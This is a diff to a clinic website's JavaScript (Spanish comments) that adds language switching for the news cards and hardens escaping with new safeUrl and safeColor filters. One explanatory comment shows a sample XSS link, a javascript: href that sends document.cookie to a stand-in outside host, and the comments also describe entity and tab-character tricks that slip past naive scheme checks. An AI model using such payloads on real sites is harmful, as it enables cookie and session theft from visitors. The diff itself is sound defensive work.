@@ -22,7 +22,18 @@
  * funcione o falle). Aqui solo esperamos ese aviso y decidimos:
  * si el admin tiene publicaciones las usamos, si no, respaldo.
  */
-document.addEventListener("rdc:content-loaded", () => {
+document.addEventListener("rdc:content-loaded", dibujarPublicaciones);
+
+/* Al cambiar de idioma hay que repintar estas tarjetas: su titulo y
+   su resumen vienen de la base con los dos idiomas dentro, y quien
+   elige cual se ve es esta funcion, no RDC_I18N.
+
+   Se repinta desde los MISMOS datos que ya estaban en memoria. No se
+   vuelve a pedir nada al servidor: el visitante no espera y la
+   clinica no gasta una peticion de su plan gratuito. */
+document.addEventListener("rdc:lang-changed", dibujarPublicaciones);
+
+function dibujarPublicaciones() {
   const fromAdmin = window.__RDC_STUDIES__;
 
   if (fromAdmin && fromAdmin.length) {
@@ -30,7 +41,7 @@ document.addEventListener("rdc:content-loaded", () => {
   } else {
     loadFallbackStudies();
   }
-});
+}
 
 
 /** Cadena de respaldo: Google Sheet -> archivo local */
@@ -51,7 +62,7 @@ async function loadFallbackStudies() {
     try {
       renderStudies(grid, await fetchFromLocalFile());
     } catch {
-      grid.innerHTML = `<p class="studies-empty">Check back soon for updates from our team.</p>`;
+      grid.innerHTML = `<p class="studies-empty">${escapeHtml(RDC_I18N.t("studies.empty"))}</p>`;
     }
   }
 }
@@ -119,7 +130,7 @@ function renderStudies(grid, posts) {
   if (!grid) return;
 
   if (!posts || !posts.length) {
-    grid.innerHTML = `<p class="studies-empty">Check back soon for updates from our team.</p>`;
+    grid.innerHTML = `<p class="studies-empty">${escapeHtml(RDC_I18N.t("studies.empty"))}</p>`;
     return;
   }
 
@@ -148,30 +159,44 @@ function postToCardHtml(post) {
   // con el color elegido. Asi nunca queda un hueco vacio.
   const cover = post.image || SITE_CONFIG.studies.defaultImage;
 
-  const media = cover
-    ? `<div class="study-card-media" style="background-image:url('${escapeAttr(cover)}')"></div>`
-    : `<div class="study-card-media" style="background:linear-gradient(135deg, ${escapeAttr(color)}, transparent)"></div>`;
+  const coverSeguro = safeUrl(cover);
+
+  const media = coverSeguro
+    ? `<div class="study-card-media" style="background-image:url('${escapeAttr(coverSeguro)}')"></div>`
+    : `<div class="study-card-media" style="background:linear-gradient(135deg, ${escapeAttr(safeColor(color))}, transparent)"></div>`;
 
   const card = `
     <article class="study-card reveal">
       ${media}
       <div class="study-card-body">
         <p class="study-card-date">${dateLabel}</p>
-        <h3>${escapeHtml(post.title || "Untitled Post")}</h3>
-        <p>${escapeHtml(post.excerpt || "")}</p>
+        <h3>${escapeHtml(RDC_I18N.pick(post.title) || RDC_I18N.t("studies.untitled"))}</h3>
+        <p>${escapeHtml(RDC_I18N.pick(post.excerpt) || "")}</p>
       </div>
     </article>
   `;
 
-  return post.link
-    ? `<a href="${escapeAttr(post.link)}" target="_blank" rel="noopener" class="study-link">${card}</a>`
+  // El enlace pasa por safeUrl y no directo por escapeAttr. Escapar
+  // las comillas impide romper el atributo, pero no impide que el
+  // atributo entero valga `javascript:...`, que es codigo que se
+  // ejecuta al hacer clic. Ver la nota larga en safeUrl().
+  const enlace = safeUrl(post.link);
+
+  return enlace
+    ? `<a href="${escapeAttr(enlace)}" target="_blank" rel="noopener" class="study-link">${card}</a>`
     : card;
 }
 
+/* La fecha se escribe en el idioma activo: "16 de agosto de 2026" o
+   "August 16, 2026". Se pasa el idioma a proposito en vez de dejar
+   undefined, que usaria el del navegador y no el que el visitante
+   acaba de elegir en el sitio. */
 function formatDate(dateStr) {
   const d = new Date(dateStr);
   if (isNaN(d)) return dateStr || "";
-  return d.toLocaleDateString(undefined, { year: "numeric", month: "long", day: "numeric" });
+
+  const locale = RDC_I18N.current() === "es" ? "es-ES" : "en-US";
+  return d.toLocaleDateString(locale, { year: "numeric", month: "long", day: "numeric" });
 }
 
 /** Evita que texto del admin se interprete como HTML */
@@ -181,7 +206,76 @@ function escapeHtml(str) {
   return div.innerHTML;
 }
 
-/** Igual, pero para valores que van dentro de un atributo */
+/**
+ * Igual, pero para valores que van dentro de un atributo.
+ *
+ * El `&` va PRIMERO y no es un detalle de estilo: si se escapara al
+ * final, convertiria en entidades los `&amp;` que acaban de crear
+ * las otras reglas. Y escapar `&` importa de verdad, porque sin eso
+ * un `&#106;avascript:` escrito a mano lo decodifica el navegador y
+ * vuelve a ser `javascript:`.
+ *
+ * Se escapa tambien la comilla simple aunque los atributos de este
+ * archivo vayan con comillas dobles: hay valores que caen dentro de
+ * un `url('...')` en un style, y ahi la comilla simple es la que
+ * delimita.
+ */
 function escapeAttr(str) {
-  return String(str == null ? "" : str).replace(/"/g, "&quot;");
+  return String(str == null ? "" : str)
+    .replace(/&/g, "&amp;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
+/**
+ * Deja pasar solo direcciones que no ejecutan nada.
+ *
+ * ------------------------------------------------------------
+ * POR QUE HACE FALTA, SI YA SE ESCAPAN LAS COMILLAS
+ * ------------------------------------------------------------
+ * Escapar comillas evita SALIR del atributo. No evita que el
+ * contenido legitimo del atributo sea codigo:
+ *
+ *     <a href="javascript:fetch('https://sitio-ajeno/'+document.cookie)">
+ *
+ * Ahi no hay ni una comilla fuera de sitio. El HTML es perfecto.
+ * Y al hacer clic, se ejecuta.
+ *
+ * Esa direccion sale del campo "Link" de una publicacion, que se
+ * escribe desde el panel. O sea: hace falta ser personal de la
+ * clinica para plantarlo — pero una vez plantado, lo ejecuta
+ * CUALQUIER visitante de la portada que pinche la tarjeta. Una
+ * cuenta del panel comprometida pasaria de "puede editar textos"
+ * a "puede correr codigo en el navegador de los pacientes".
+ *
+ * Se limpian los caracteres de control antes de mirar el esquema
+ * porque el navegador tambien los ignora: `java&#9;script:` es
+ * `javascript:` para el, y seria `java\tscript:` para una
+ * comprobacion ingenua.
+ * ------------------------------------------------------------
+ */
+function safeUrl(url) {
+  const limpio = String(url == null ? "" : url)
+    .replace(/[\u0000-\u0020\u007f-\u009f]/g, "");
+
+  if (!limpio) return "";
+
+  // Sin esquema: ruta relativa o ancla. No hay nada que secuestrar.
+  if (!/^[a-z][a-z0-9+.-]*:/i.test(limpio)) return limpio;
+
+  return /^(https?|mailto|tel):/i.test(limpio) ? limpio : "";
+}
+
+/**
+ * El color va dentro de un `style`, donde escapar comillas no basta:
+ * un `red;position:fixed;inset:0` taparia la pagina entera. Se
+ * acepta solo lo que de verdad es un color.
+ */
+function safeColor(value) {
+  const v = String(value == null ? "" : value).trim();
+  return /^(#[0-9a-f]{3,8}|[a-z]+|rgba?\([\d\s.,%]+\)|hsla?\([\d\s.,%]+\))$/i.test(v)
+    ? v
+    : "#2dd4bf";
 }
